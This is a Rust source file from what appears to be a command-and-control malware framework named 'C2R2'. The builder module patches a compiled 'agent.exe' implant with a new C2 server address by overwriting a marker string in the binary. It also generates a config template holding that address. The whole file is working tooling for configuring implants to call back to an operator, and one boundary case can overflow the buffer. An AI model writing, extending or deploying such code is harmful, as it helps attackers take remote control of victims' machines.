// File: builder/src/patch.rs
// Binary patching for agent configuration without recompilation

use std::fs;
use std::io::{Read, Write};
use std::path::Path;

/// Magic marker in the binary to identify where the server address is stored
/// This should match the marker in agent/src/config.rs
const SERVER_MARKER: &[u8] = b"C2R2_SERVER_ADDRESS_PLACEHOLDER_";
const MAX_SERVER_LENGTH: usize = 64; // Maximum length for "IP:PORT" string

/// Patch an existing agent.exe binary with a new server address
/// This allows configuration without recompilation
pub fn patch_agent_binary(
    input_path: &str,
    output_path: &str,
    new_server: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Parcheando binario del agente...");
    println!("   📄 Input: {}", input_path);
    println!("   📄 Output: {}", output_path);
    println!("   🌐 Nuevo servidor: {}", new_server);

    // Validate server address length
    if new_server.len() > MAX_SERVER_LENGTH {
        return Err(format!(
            "❌ Dirección de servidor demasiado larga (max {} caracteres)",
            MAX_SERVER_LENGTH
        )
        .into());
    }

    // Read the original binary
    if !Path::new(input_path).exists() {
        return Err(format!("❌ Archivo no encontrado: {}", input_path).into());
    }

    let mut binary_data = Vec::new();
    let mut file = fs::File::open(input_path)?;
    file.read_to_end(&mut binary_data)?;

    println!("   📊 Tamaño del binario: {} bytes", binary_data.len());

    // Find the marker in the binary
    let marker_pos = binary_data
        .windows(SERVER_MARKER.len())
        .position(|window| window == SERVER_MARKER);

    match marker_pos {
        Some(pos) => {
            println!("   ✓ Marcador encontrado en offset: 0x{:X}", pos);

            // Create the new server string with padding
            let mut new_server_bytes = vec![0u8; MAX_SERVER_LENGTH + SERVER_MARKER.len()];

            // Copy marker
            new_server_bytes[..SERVER_MARKER.len()].copy_from_slice(SERVER_MARKER);

            // Copy new server address
            let server_bytes = new_server.as_bytes();
            new_server_bytes[SERVER_MARKER.len()..SERVER_MARKER.len() + server_bytes.len()]
                .copy_from_slice(server_bytes);

            // Null-terminate
            new_server_bytes[SERVER_MARKER.len() + server_bytes.len()] = 0;

            // Replace in binary
            let end_pos = pos + SERVER_MARKER.len() + MAX_SERVER_LENGTH;
            if end_pos <= binary_data.len() {
                binary_data[pos..end_pos].copy_from_slice(&new_server_bytes);
                println!("   ✓ Servidor actualizado correctamente");
            } else {
                return Err("❌ No hay suficiente espacio en el binario para el parche".into());
            }
        }
        None => {
            return Err("❌ Marcador no encontrado en el binario. \
                El binario debe ser compilado con soporte para patching."
                .into());
        }
    }

    // Write the patched binary
    let mut output_file = fs::File::create(output_path)?;
    output_file.write_all(&binary_data)?;

    println!("✅ Binario parcheado exitosamente!");
    println!("   📦 Agente configurado: {}", output_path);

    Ok(())
}

/// Generate a template agent with placeholder for patching
/// This is used during the build process to create a base agent
#[allow(dead_code)]
pub fn prepare_patchable_config(c2_server: &str) -> String {
    // Create a config with a marker that can be found and replaced
    let _padded_server = format!("{:\0<width$}", c2_server, width = MAX_SERVER_LENGTH);

    format!(
        r#"// Generado automáticamente por C2R2 Builder v2.0
// Este archivo contiene un marcador para permitir patching binario

// IMPORTANTE: El marcador debe ser único y fácilmente localizable en el binario
const _MARKER: &[u8] = b"C2R2_SERVER_ADDRESS_PLACEHOLDER_";

// El servidor C2 con padding para permitir reemplazo in-place
pub const C2_SERVER: &str = concat!(
    "{}",
    "{}"  // Padding nulls
);
"#,
        c2_server,
        "\0".repeat(MAX_SERVER_LENGTH - c2_server.len())
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_server_length_validation() {
        let long_server = "a".repeat(MAX_SERVER_LENGTH + 1);
        let short_server = "127.0.0.1:4444";

        // This would fail in actual patching
        assert!(long_server.len() > MAX_SERVER_LENGTH);
        assert!(short_server.len() <= MAX_SERVER_LENGTH);
    }
}
